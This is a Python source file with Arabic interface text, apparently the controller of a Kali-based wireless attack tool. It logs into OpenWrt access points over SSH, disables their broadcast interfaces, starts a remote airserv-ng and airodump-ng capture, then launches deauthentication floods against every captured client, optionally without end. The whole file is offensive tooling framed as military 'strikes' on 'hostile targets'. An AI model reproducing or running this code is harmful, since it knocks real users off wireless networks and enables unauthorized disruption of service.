#!/usr/bin/env python3
import sys, os, time, threading, subprocess

sys.path.insert(0, "/home/kali/AeroCage-X")
from core.ui_base import UIBase, C_CYAN, G_OK, R_ERR, Y_WARN, D_DIV, RESET
from core.ssh_commander import SSHCommander
from core.intel_ubus_scout import IntelUbusScout

from modules.strike_anchor import StrikeAnchor
from modules.strike_multicast import StrikeMulticast
from modules.strike_recon_logger import StrikeReconLogger
from modules.strike_csv_parser import StrikeCsvParser
from modules.strike_smart_fire import StrikeSmartFire
from modules.strike_cleanup import StrikeCleanup
from modules.strike_tunnel import StrikeTunnel
from modules.m3_kali_pipeline import M3KaliPipeline

class UIStrike:
    def __init__(self):
        self.active_strikes = {}
        self.protected_logs = []
        self.suppressed_sections = []
        self.lock = threading.Lock()
        self.is_running = True

    def listen_control_input(self):
        while self.is_running:
            try:
                choice = input().strip()
                if choice == "0": self.is_running = False; break
                elif choice.lower() == "all":
                    with self.lock:
                        for num, s in self.active_strikes.items():
                            pid = s.get('pid', 'N/A')
                            if pid and pid != "N/A": subprocess.run(f"kill -9 {pid} 2>/dev/null", shell=True)
                        self.active_strikes.clear()
                elif choice.isdigit() and int(choice) in self.active_strikes:
                    num = int(choice)
                    with self.lock:
                        pid = self.active_strikes[num]["pid"]
                        if pid and pid != "N/A": subprocess.run(f"kill -9 {pid} 2>/dev/null", shell=True)
                        del self.active_strikes[num]
            except Exception: pass

    @staticmethod
    def launch(db):
        aps = db.get_all_access_points()
        if not aps: return
        UIBase.show_header("محرك الضربات الموجهة والمواجهات التفاعلية")
        for idx, row in enumerate(aps):
            ap_id, ap_name, ap_ip, ap_user, ap_pass, g_name = row
            print(f"   [{idx+1}] | {ap_name:<25} | {ap_ip}")
            
        opt = input("\n🔢 اختر رقم الأكسس لبدء العمليات: ").strip()
        if not opt.isdigit() or int(opt) > len(aps): return
        ap_id, ap_name, ap_ip, ap_user, ap_pass, g_name = aps[int(opt)-1]
        
        band_opt = input("🌐 اختر نطاق التردد المستهدف [1: للـ 2G | 2: للـ 5G]: ").strip()
        selected_band = "5G" if band_opt == "2" else "2G"
        comm = SSHCommander(ip=ap_ip, password=ap_pass, username=ap_user)
        
        sample_iface = "phy0-ap0" if selected_band == "5G" else "phy1-ap0"
        radio_node, _ = StrikeAnchor.detect_radio_and_bssid(comm, selected_band, sample_iface)
        mon_iface = "phy0-mon0" if radio_node == "radio0" else "phy1-mon0"
        
        orig_chan = StrikeAnchor.backup_original_channel(comm, radio_node)
        ifaces, _ = IntelUbusScout.query_interfaces(comm, selected_band)

        print(f"\n{G_OK}[ واجهات البث المتاحة عتادياً والزبائن والسرعات النشطة حياً بالأثير ]:{RESET}")
        total_clients = 0
        for name, data in ifaces.items():
            print(f"  📡 الواجهة: {name:<10} | 🌐 SSID: {data['ssid']}")
            clients = IntelUbusScout.get_live_clients(comm, data['service'])
            if clients:
                total_clients += len(clients)
                for c in clients: print(f"      📱 MAC: {c['mac']} | 📶 الإشارة: {c['signal']:<8} | 🚀 السرعة: {c['rate']}")
            else: print(f"      └── {D_DIV}عامل الاستقرار: لا توجد أجهزة متصلة حالياً في هذه الواجهة.{RESET}")
            print(f"  {D_DIV}───────────────────────────────────────────────────────────────────────{RESET}")

        if total_clients > 0:
            print(f"\n{Y_WARN}[⚠️ تنبيه لوجستي]: يوجد {total_clients} أجهزة مرتبطة بهوتسبوت أجهزتك حالياً.{RESET}")
            
        target_channel = input(f"\n📶 أدخل رقم القناة المستهدفة للهجوم (اضغط Enter للافتراضية {orig_chan}): ").strip()
        if not target_channel: target_channel = orig_chan
        pkts_count = int(c) if (c := input("🚀 أدخل عدد حزم الفصل لكل جهاز (0 للحقن المستمر): ").strip()).isdigit() else 0

        choice = input(f"\n🔢 هل تأذن للمنظومة الآن بالتعطيل بالـ uci وإشعال الأنفاق؟ (y/n): ").strip().lower()
        if choice != 'y': return

        engine = UIStrike()
        _, stdout, _ = comm.execute_pure_cmd(f"uci show wireless | grep '.device={radio_node}' | cut -d'.' -f2")
        engine.suppressed_sections = [s.strip() for s in stdout.strip().split('\n') if s.strip()]

        print(f"\n[*] جاري تعطيل واجهات البث وقفل القناة التكتيكية بالـ uci لحظر التداخل...")
        StrikeTunnel.suppress_and_build_monitor(comm, radio_node, mon_iface, target_channel)
        
        d_port = StrikeTunnel.fire_remote_airserv(comm, selected_band, ap_id, target_channel, mon_iface)
        target_socket = f"{ap_ip}:{d_port}"
        print(f"🚀 تم إطلاق سيرفر airserv-ng بنجاح عتادياً على البورت: {target_socket}")
        
        csv_path = M3KaliPipeline.start_recon_stream(ap_name, selected_band, target_channel, target_socket)

        # [إطلاق حلقة تفاعل صمامات المهلة بقرار القائد فهد]:
        stations = []
        while True:
            print(f"[*] جاري شحن وقضم ملف الـ CSV (تفعيل نظام المحاولات الموقوتة)...")
            stations, ap_map, status_msg = M3KaliPipeline.retry_parse_pipeline(csv_path)
            print(f"  └── {status_msg}")
            
            if stations: break # إذا التقط الأهداف، يكسر الحلقة وينتقل للقذف فوراً
            
            # [بوابة صمام السيطرة والقرار التفاعلي حياً لطلبك]:
            print(f"\n{Y_WARN}[⚠️ تنبيه استخباري]: ملف الـ CSV خالي تماماً من الأهداف المعادية بالأثير حتى الآن!{RESET}")
            print(f" [{G_OK}1{RESET}] منح الأيردمب مهلة إضافية وإعادة محاولة الفحص والقضم حياً")
            print(f" [{C_CYAN}2{RESET}] فتح واجهة الأيردمب المرئية حياً في تيرمنال مستقل (Qterminal) للتأكد البصري")
            print(f" [{R_ERR}3{RESET}] إلغاء جولة الهجوم كلياً والانسحاب وتطهير العتاد")
            print(f" ─────────────────────────────────────────────────────────────────────────")
            panel_choice = input("🔢 الاختيار التكتيكي الحركي: ").strip()
            
            if panel_choice == "1":
                print("\n[*] جاري تمديد الوقت وإعطاء مهلة تنفس إضافية للأثير...")
                continue
            elif panel_choice == "2":
                print(f"\n🚀 جاري قذف واستدعاء شاشة تيرمنال Qterminal مستقلة لعرض النفق حياً: {target_socket}...")
                # فتح الأيردمب المرئي أمام عينك حياً في نافذة كالي مستقلة لتشاهد حركة الحزم بنفسك لطلبك
                subprocess.Popen(f"qterminal -e 'airodump-ng --channel {target_channel} {target_socket}'", shell=True)
                time.sleep(2)
                continue
            else:
                print(f"\n{R_ERR}[-] تم إصدار أمر الانسحاب والتراجع الطاهر من القائد فهد.{RESET}")
                # تنظيف عتادي فوري عند قرار الإلغاء ومنع تسريب القيم
                for sec in engine.suppressed_sections: comm.execute_pure_cmd(f"uci del wireless.{sec}.disabled 2>/dev/null")
                comm.execute_pure_cmd(f"uci del wireless.mon_{radio_node}_vif 2>/dev/null; uci commit wireless")
                StrikeCleanup.restore_and_purge(comm, radio_node, orig_chan, mon_iface, engine.active_strikes, engine.suppressed_sections)
                UIBase.return_prompt(); return

        # تحضير وتوليد الذخيرة بعد الخروج الناجح من حلقة صمام القرار
        clean_pool, engine.protected_logs = StrikeCsvParser.compile_payload_sh(stations, pkts_count, target_socket)

        for s_idx, tgt in enumerate(clean_pool):
            pid = StrikeSmartFire.fire_and_get_pid(tgt["cmd"], tgt["client"], target_socket)
            engine.active_strikes[s_idx + 1] = {"client": tgt["client"], "pid": pid, "status": "يتم قذفه حياً 🚀"}

        t = threading.Thread(target=engine.listen_control_input)
        t.daemon = True; t.start()

        while engine.is_running and engine.active_strikes:
            stations_update = M3KaliPipeline.ingest_live_stations(csv_path) if hasattr(M3KaliPipeline, 'ingest_live_stations') else []
            if not stations_update: stations_update, _ = StrikeCsvParser.parse_live_data(csv_path)
            updated_strikes = StrikeSmartFire.verify_potency(stations_update, engine.active_strikes.copy())
            with engine.lock:
                engine.active_strikes = updated_strikes
                render_dash = __import__("modules.strike_panel_ui", fromlist=["StrikePanelUI"]).StrikePanelUI.render
                render_dash(ap_name, target_channel, selected_band, engine.active_strikes, engine.protected_logs)
            time.sleep(1.5)

        engine.is_running = False
        for sec in engine.suppressed_sections: comm.execute_pure_cmd(f"uci del wireless.{sec}.disabled 2>/dev/null")
        comm.execute_pure_cmd(f"uci del wireless.mon_{radio_node}_vif 2>/dev/null; uci commit wireless")
        StrikeCleanup.restore_and_purge(comm, radio_node, orig_chan, mon_iface, engine.active_strikes, engine.suppressed_sections)
        UIBase.return_prompt()
